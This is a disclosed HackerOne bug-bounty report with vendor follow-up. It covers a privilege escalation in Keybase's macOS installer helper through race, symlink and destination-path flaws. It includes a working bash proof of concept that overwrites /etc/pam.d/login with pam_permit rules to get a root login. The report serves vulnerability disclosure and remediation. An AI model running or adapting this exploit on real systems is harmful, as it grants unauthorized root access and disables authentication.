{"id":473252,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzMyNTI=","url":"https://hackerone.com/reports/473252","title":"Privilege Escalation through Keybase Installer via Helper","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-12-30T05:48:58.619Z","submitted_at":"2018-12-30T05:48:58.619Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jinmo123","url":"/jinmo123","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2809,"url":"https://hackerone.com/keybase","handle":"keybase","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Keybase","twitter_handle":"keybaseio","website":"https://keybase.io","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-01-30T18:59:22.293Z","bug_reporter_agreed_on_going_public_at":"2019-01-30T18:59:22.209Z","team_member_agreed_on_going_public_at":"2019-01-30T18:16:08.064Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Keybase.app is bundled with the components installer named KeybaseInstaller.app. When `--install-app-bundle --source-path \u003csrc\u003e --app-path \u003cdst\u003e` is given to installer, KBAppBundle.m checks if `\u003csrc\u003e`  is properly codesigned, then copies it to `\u003cdst\u003e`.\n\nFirst, there's two vulnerabilities in the source path validation: the check is racy, there's no symlink check.\n\n## 1. Race condition\n\nSince now the privileged helper (user=root) only accepts XPC request from 'admin' group, The path `/Application/Keybase.app` is often writable. So I think that race condition is possible between (1) and (2).\n\n```objc\n(1)   [self validate:sourcePath completion:^(NSError *error) {\n        if (error) {\n          completion(error);\n          return;\n        }\n\n        DDLogInfo(@\"Copying app bundle %@ to %@\", sourcePath, destinationPath);\n        NSDictionary *params = @{@\"source\": sourcePath, @\"destination\": destinationPath};\n(2)     [self.helperTool.helper sendRequest:@\"move\" params:@[params] completion:^(NSError *error, id value) {\n```\n\nSuccessful exploitation will bypass the source check. I skipped writing PoC code since the race window is bit narrow.\n\n## 2. No symbolic link check\n\nIf source path is symbolic link to /Application/Keybase.app, the check is bypassed. Attacker can make a symbolic link like this:\n\n/tmp/A -\u003e /tmp/B -\u003e /Application/Keybase.app\n\nBecause the helper uses `NSFileManager::moveItemAtPath`, the symbolic link itself is copied. Copying /tmp/A causes destination path to be a symbolic link to /tmp/B, and further it can be modified to our file.\n\n## 3. Missing check for destination\n\nSecond, there's no check for the destination path, which is passed from `--app-path` parameter. This makes the admin to overwrite any file or folder like `/etc`.\n\nCombining 2, 3, user can overwrite any files to point the writable path.\n\n```bash\n#!/bin/bash\n\nexport APP=/Applications/Keybase.app\nexport INSTALLER=$APP/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase\n\nexport A=/tmp/_$RANDOM\nexport B=/tmp/_$RANDOM\n\n# This script does `ln -sf /tmp/$R $DEST` in root permission\nexport DEST=/etc/pam.d/login\n\nrm -rf $A $B\nln -s $APP $B\nln -s $B $A\n\n$INSTALLER --run-mode=prod --app-path=$DEST --timeout=8 --install-app-bundle --source-path=$A --debug\n\n# Now $DEST -\u003e /tmp/$B (symlink)\n# replace /tmp/$B to own contents\nrm -rf /tmp/$B\n\ncat \u003e /tmp/$B \u003c\u003cEOF\n# login: auth account password session\nauth       optional       pam_permit.so\nauth       optional       pam_permit.so\nauth       optional       pam_permit.so\nauth       required       pam_permit.so\naccount    required       pam_permit.so\naccount    required       pam_permit.so\npassword   required       pam_permit.so\nsession    required       pam_permit.so\nsession    required       pam_permit.so\nsession    optional       pam_permit.so\n\nEOF\n\n# Now there's no pam-based check for /usr/bin/login\necho id | login root\n```\n\n\n\n## Patch\n\n### Source path check\n\nMaybe the app bundle can be compressed with proper signature, and checked in the way of the redirector check on [KBHelper.m line 260](https://github.com/keybase/client/blob/363e5462a0805db3fb5b5e31f9f5bc2d4d01964f/osx/Helper/KBHelper.m#L260), and extracted in the helper.\n\n### Destination path check\n\nI'm not sure how this can have additional restrictions, but maybe user alerts like those in `--install-helper` would be good. Alternatively, checking if `app_path == \"/Applications/Keybase.app\"` will work, too.\n\n## Impact\n\nThe privilege can be escalated to 'root' from any user in 'admin' group (including the default user) and have access to keybase.Helper XPC service.","vulnerability_information_html":"\u003cp\u003eKeybase.app is bundled with the components installer named KeybaseInstaller.app. When \u003ccode\u003e--install-app-bundle --source-path \u0026lt;src\u0026gt; --app-path \u0026lt;dst\u0026gt;\u003c/code\u003e is given to installer, KBAppBundle.m checks if \u003ccode\u003e\u0026lt;src\u0026gt;\u003c/code\u003e  is properly codesigned, then copies it to \u003ccode\u003e\u0026lt;dst\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eFirst, there\u0026#39;s two vulnerabilities in the source path validation: the check is racy, there\u0026#39;s no symlink check.\u003c/p\u003e\n\n\u003ch2 id=\"1-race-condition\"\u003e1. Race condition\u003c/h2\u003e\n\n\u003cp\u003eSince now the privileged helper (user=root) only accepts XPC request from \u0026#39;admin\u0026#39; group, The path \u003ccode\u003e/Application/Keybase.app\u003c/code\u003e is often writable. So I think that race condition is possible between (1) and (2).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight objective_c\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e   \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eself\u003c/span\u003e \u003cspan class=\"nf\"\u003evalidate\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"n\"\u003esourcePath\u003c/span\u003e \u003cspan class=\"nf\"\u003ecompletion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"o\"\u003e^\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eNSError\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"n\"\u003ecompletion\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n          \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n        \u003cspan class=\"n\"\u003eDDLogInfo\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e@\u0026quot;Copying app bundle %@ to %@\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esourcePath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edestinationPath\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eNSDictionary\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eparams\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e@{\u003c/span\u003e\u003cspan class=\"s\"\u003e@\u0026quot;source\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003esourcePath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e@\u0026quot;destination\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003edestinationPath\u003c/span\u003e\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e     \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ehelperTool\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ehelper\u003c/span\u003e \u003cspan class=\"nf\"\u003esendRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e@\u0026quot;move\u0026quot;\u003c/span\u003e \u003cspan class=\"nf\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e:@[\u003c/span\u003e\u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"n\"\u003ecompletion\u003c/span\u003e\u003cspan class=\"o\"\u003e:^\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eNSError\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eid\u003c/span\u003e \u003cspan class=\"n\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSuccessful exploitation will bypass the source check. I skipped writing PoC code since the race window is bit narrow.\u003c/p\u003e\n\n\u003ch2 id=\"2-no-symbolic-link-check\"\u003e2. No symbolic link check\u003c/h2\u003e\n\n\u003cp\u003eIf source path is symbolic link to /Application/Keybase.app, the check is bypassed. Attacker can make a symbolic link like this:\u003c/p\u003e\n\n\u003cp\u003e/tmp/A -\u0026gt; /tmp/B -\u0026gt; /Application/Keybase.app\u003c/p\u003e\n\n\u003cp\u003eBecause the helper uses \u003ccode\u003eNSFileManager::moveItemAtPath\u003c/code\u003e, the symbolic link itself is copied. Copying /tmp/A causes destination path to be a symbolic link to /tmp/B, and further it can be modified to our file.\u003c/p\u003e\n\n\u003ch2 id=\"3-missing-check-for-destination\"\u003e3. Missing check for destination\u003c/h2\u003e\n\n\u003cp\u003eSecond, there\u0026#39;s no check for the destination path, which is passed from \u003ccode\u003e--app-path\u003c/code\u003e parameter. This makes the admin to overwrite any file or folder like \u003ccode\u003e/etc\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eCombining 2, 3, user can overwrite any files to point the writable path.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/bash\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eexport \u003c/span\u003e\u003cspan class=\"nv\"\u003eAPP\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/Applications/Keybase.app\n\u003cspan class=\"nb\"\u003eexport \u003c/span\u003e\u003cspan class=\"nv\"\u003eINSTALLER\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$APP\u003c/span\u003e/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase\n\n\u003cspan class=\"nb\"\u003eexport \u003c/span\u003e\u003cspan class=\"nv\"\u003eA\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/tmp/_\u003cspan class=\"nv\"\u003e$RANDOM\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eexport \u003c/span\u003e\u003cspan class=\"nv\"\u003eB\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/tmp/_\u003cspan class=\"nv\"\u003e$RANDOM\u003c/span\u003e\n\n\u003cspan class=\"c\"\u003e# This script does `ln -sf /tmp/$R $DEST` in root permission\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eexport \u003c/span\u003e\u003cspan class=\"nv\"\u003eDEST\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc/pam.d/login\n\n\u003cspan class=\"nb\"\u003erm\u003c/span\u003e \u003cspan class=\"nt\"\u003e-rf\u003c/span\u003e \u003cspan class=\"nv\"\u003e$A\u003c/span\u003e \u003cspan class=\"nv\"\u003e$B\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eln\u003c/span\u003e \u003cspan class=\"nt\"\u003e-s\u003c/span\u003e \u003cspan class=\"nv\"\u003e$APP\u003c/span\u003e \u003cspan class=\"nv\"\u003e$B\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eln\u003c/span\u003e \u003cspan class=\"nt\"\u003e-s\u003c/span\u003e \u003cspan class=\"nv\"\u003e$B\u003c/span\u003e \u003cspan class=\"nv\"\u003e$A\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$INSTALLER\u003c/span\u003e \u003cspan class=\"nt\"\u003e--run-mode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eprod \u003cspan class=\"nt\"\u003e--app-path\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$DEST\u003c/span\u003e \u003cspan class=\"nt\"\u003e--timeout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e8 \u003cspan class=\"nt\"\u003e--install-app-bundle\u003c/span\u003e \u003cspan class=\"nt\"\u003e--source-path\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$A\u003c/span\u003e \u003cspan class=\"nt\"\u003e--debug\u003c/span\u003e\n\n\u003cspan class=\"c\"\u003e# Now $DEST -\u0026gt; /tmp/$B (symlink)\u003c/span\u003e\n\u003cspan class=\"c\"\u003e# replace /tmp/$B to own contents\u003c/span\u003e\n\u003cspan class=\"nb\"\u003erm\u003c/span\u003e \u003cspan class=\"nt\"\u003e-rf\u003c/span\u003e /tmp/\u003cspan class=\"nv\"\u003e$B\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003ecat\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e /tmp/\u003cspan class=\"nv\"\u003e$B\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e\u003cspan class=\"no\"\u003eEOF\u003c/span\u003e\u003cspan class=\"sh\"\u003e\n# login: auth account password session\nauth       optional       pam_permit.so\nauth       optional       pam_permit.so\nauth       optional       pam_permit.so\nauth       required       pam_permit.so\naccount    required       pam_permit.so\naccount    required       pam_permit.so\npassword   required       pam_permit.so\nsession    required       pam_permit.so\nsession    required       pam_permit.so\nsession    optional       pam_permit.so\n\u003c/span\u003e\u003cspan class=\"no\"\u003e\nEOF\n\n\u003c/span\u003e\u003cspan class=\"c\"\u003e# Now there\u0026#39;s no pam-based check for /usr/bin/login\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eecho id\u003c/span\u003e | login root\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003ch3 id=\"source-path-check\"\u003eSource path check\u003c/h3\u003e\n\n\u003cp\u003eMaybe the app bundle can be compressed with proper signature, and checked in the way of the redirector check on \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fkeybase%2Fclient%2Fblob%2F363e5462a0805db3fb5b5e31f9f5bc2d4d01964f%2Fosx%2FHelper%2FKBHelper.m%23L260\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eKBHelper.m line 260\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, and extracted in the helper.\u003c/p\u003e\n\n\u003ch3 id=\"destination-path-check\"\u003eDestination path check\u003c/h3\u003e\n\n\u003cp\u003eI\u0026#39;m not sure how this can have additional restrictions, but maybe user alerts like those in \u003ccode\u003e--install-helper\u003c/code\u003e would be good. Alternatively, checking if \u003ccode\u003eapp_path == \u0026quot;/Applications/Keybase.app\u0026quot;\u003c/code\u003e will work, too.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe privilege can be escalated to \u0026#39;root\u0026#39; from any user in \u0026#39;admin\u0026#39; group (including the default user) and have access to keybase.Helper XPC service.\u003c/p\u003e\n","bounty_amount":"2500.0","formatted_bounty":"$2,500","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":17,"voters":["mirchr","dxaxpanda","bl4de","spam404","setuid0","dhakal_ananda","mygf","kunal94","khizer47","cyberunit","and 7 more..."],"severity":{"rating":"high","score":8.2,"author_type":"User","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"high","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3905705,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fixed some typos in the PoC script. Also, attached a video executing the script (thanks to c3ctf for the infrastructure).","markdown_message":"\u003cp\u003eFixed some typos in the PoC script. Also, attached a video executing the script (thanks to c3ctf for the infrastructure).\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-30T08:21:39.516Z","updated_at":"2018-12-30T08:21:39.516Z","actor":{"username":"jinmo123","cleared":false,"url":"/jinmo123","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":398911,"filename":"video.mp4","type":"video/quicktime","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/398/911/2c3b791954e97bb883a93683fc112af9054b187e/video.mp4?response-content-disposition=attachment%3B%20filename%3D%22video.mp4%22%3B%20filename%2A%3DUTF-8%27%27video.mp4\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR35GR77K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060317Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCkRanG9z5zVLdCyDzQPrLE3FYUPIiibXLrC%2FbV7ethQgIgW3VYr7ML9zFS7keXgTden2zkvr6xtk%2Bwqk4LfHGPkcUqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCiVagLxMUVikdnfsCqRA2ESo%2FIThyM%2BI3TCZtigaox50Q4zhKxTQUgUM4jlR9ukMcmdu%2BCIgxqNXnFit2GwvZneedN1j%2Bbb2Lf%2Fk9LJIBloG0%2BBQ0DIW5llPzhlHBsf8qtXHgtlw3rsN1B9wIqRFFMGG4erHLHiQ927dumft3fH4WdUWWVFhaFZW%2Bw4BBxYga3%2FaAi3ovDfVVALXK5%2BpCaFWVs%2FpaNk%2FyE3nUH75JZvja1tpNt%2F6qsqsoaXl8ySebrstQXUEOB%2Be7AzgomPo1txxlxQRCWAxLJ91zb%2F8zbc4Mpqm3pYwpxNZNRMuJXf4gzHggFM%2F7EkopM926Hsh9N4eLnJ1YBbqX5nnqAx55PEzHirbBxZ31aDZRbfbmB1%2BCiOEV8iMEpwvIsyUZuOSffvpzs7Qe3dj2pI6zhzA0wUT5LPywpwV5LVDQwbGng87pA%2Bgtcg27onS7Jn48hXv6UkYG%2FjlBuSEho0agiNLjv8bIxpSHhah2llBo0iC%2FiJ6%2FmqISjfYpqB%2FXgA1aFX1J8VmBmDpEvse7vhRyn5GK%2BNMMjyqv8FOusBHTvY1UWZJTekbF8f0h5%2Fm9EETlkX57JGosj1P6za%2F%2BD1YhhGhxzYMqBjP4hJZrSDsKea8vBxlLbsPJ8Zp1AAhrC9YRtCof2hTYz2%2BhsURQSGCBeuFyIDmWSH5JQoO43ilJhDzyewxnrYD%2BeM5KfEX4%2Fn5D9vBPxSv0EAr8PalTK5ZAcoJBHWWJ9pMQRjAqFKZVsT5TOjOi1OL0hsm4jWxfvejzxF5%2F3DrF%2BlMwOzwjOAJZgOrX0soe5jTVlSMpmCtRzgiDMIQz0P5TQyzi0oxvgKgrkhIF7bwqbkYqDYIH4z2J2IflgXhzV%2BUQ%3D%3D\u0026X-Amz-Signature=5f3f819844760e0740b78273682cd1a5180589ff2a89def3eb0955e4e992a9ba"},{"id":398910,"filename":"exp.sh","type":"text/x-shellscript","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/398/910/2953bd3b3b94d6eda43b307307cddacaffd2fdf5/exp.sh?response-content-disposition=attachment%3B%20filename%3D%22exp.sh%22%3B%20filename%2A%3DUTF-8%27%27exp.sh\u0026response-content-type=text%2Fx-shellscript\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR35GR77K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060317Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCkRanG9z5zVLdCyDzQPrLE3FYUPIiibXLrC%2FbV7ethQgIgW3VYr7ML9zFS7keXgTden2zkvr6xtk%2Bwqk4LfHGPkcUqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCiVagLxMUVikdnfsCqRA2ESo%2FIThyM%2BI3TCZtigaox50Q4zhKxTQUgUM4jlR9ukMcmdu%2BCIgxqNXnFit2GwvZneedN1j%2Bbb2Lf%2Fk9LJIBloG0%2BBQ0DIW5llPzhlHBsf8qtXHgtlw3rsN1B9wIqRFFMGG4erHLHiQ927dumft3fH4WdUWWVFhaFZW%2Bw4BBxYga3%2FaAi3ovDfVVALXK5%2BpCaFWVs%2FpaNk%2FyE3nUH75JZvja1tpNt%2F6qsqsoaXl8ySebrstQXUEOB%2Be7AzgomPo1txxlxQRCWAxLJ91zb%2F8zbc4Mpqm3pYwpxNZNRMuJXf4gzHggFM%2F7EkopM926Hsh9N4eLnJ1YBbqX5nnqAx55PEzHirbBxZ31aDZRbfbmB1%2BCiOEV8iMEpwvIsyUZuOSffvpzs7Qe3dj2pI6zhzA0wUT5LPywpwV5LVDQwbGng87pA%2Bgtcg27onS7Jn48hXv6UkYG%2FjlBuSEho0agiNLjv8bIxpSHhah2llBo0iC%2FiJ6%2FmqISjfYpqB%2FXgA1aFX1J8VmBmDpEvse7vhRyn5GK%2BNMMjyqv8FOusBHTvY1UWZJTekbF8f0h5%2Fm9EETlkX57JGosj1P6za%2F%2BD1YhhGhxzYMqBjP4hJZrSDsKea8vBxlLbsPJ8Zp1AAhrC9YRtCof2hTYz2%2BhsURQSGCBeuFyIDmWSH5JQoO43ilJhDzyewxnrYD%2BeM5KfEX4%2Fn5D9vBPxSv0EAr8PalTK5ZAcoJBHWWJ9pMQRjAqFKZVsT5TOjOi1OL0hsm4jWxfvejzxF5%2F3DrF%2BlMwOzwjOAJZgOrX0soe5jTVlSMpmCtRzgiDMIQz0P5TQyzi0oxvgKgrkhIF7bwqbkYqDYIH4z2J2IflgXhzV%2BUQ%3D%3D\u0026X-Amz-Signature=163722c5b69c19b530464e8e3cf6a254e240090f5e28ea10c38d763814bff326"}],"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3905992,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the report, we'll work on a fix.","markdown_message":"\u003cp\u003eThanks for the report, we\u0026#39;ll work on a fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-30T10:10:04.429Z","updated_at":"2018-12-30T10:10:04.429Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3912758,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We have a fix in this PR: https://github.com/keybase/client/pull/15265/files\n\nAnd we have a preview build here: https://s3.amazonaws.com/prerelease.keybase.io/darwin-test/Keybase-2.12.5-20190101163554%2Bc4dec09.dmg\n\nWe wound up making some architectural changes to the helper/installer process split, so that now the unprivileged installer does most of the work.  This solves the issue you brought up as well as others that we haven't discovered.\n\nIf you get a chance, can you take a look and confirm the hole you found is fixed? Many thanks!\n","markdown_message":"\u003cp\u003eWe have a fix in this PR: \u003ca title=\"https://github.com/keybase/client/pull/15265/files\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fkeybase%2Fclient%2Fpull%2F15265%2Ffiles\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/keybase/client/pull/15265/files\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAnd we have a preview build here: \u003ca title=\"https://s3.amazonaws.com/prerelease.keybase.io/darwin-test/Keybase-2.12.5-20190101163554%2Bc4dec09.dmg\" href=\"/redirect?url=https%3A%2F%2Fs3.amazonaws.com%2Fprerelease.keybase.io%2Fdarwin-test%2FKeybase-2.12.5-20190101163554%252Bc4dec09.dmg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://s3.amazonaws.com/prerelease.keybase.io/darwin-test/Keybase-2.12.5-20190101163554%2Bc4dec09.dmg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe wound up making some architectural changes to the helper/installer process split, so that now the unprivileged installer does most of the work.  This solves the issue you brought up as well as others that we haven\u0026#39;t discovered.\u003c/p\u003e\n\n\u003cp\u003eIf you get a chance, can you take a look and confirm the hole you found is fixed? Many thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-01T18:16:07.257Z","updated_at":"2019-01-01T18:16:07.257Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3919241,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, I was busy yesturday. Today I saw the hotfix_2_12_6 branch. Which one will be finally applied? Thanks!","markdown_message":"\u003cp\u003eSorry, I was busy yesturday. Today I saw the hotfix_2_12_6 branch. Which one will be finally applied? Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-03T10:36:05.629Z","updated_at":"2019-01-03T10:36:05.629Z","actor":{"username":"jinmo123","cleared":false,"url":"/jinmo123","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3919296,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I saw the source code, and it seems like the vuln in AppBundle is fixed. Thanks! (maybe the uninstallation part can be moved to installer binary?)","markdown_message":"\u003cp\u003eI saw the source code, and it seems like the vuln in AppBundle is fixed. Thanks! (maybe the uninstallation part can be moved to installer 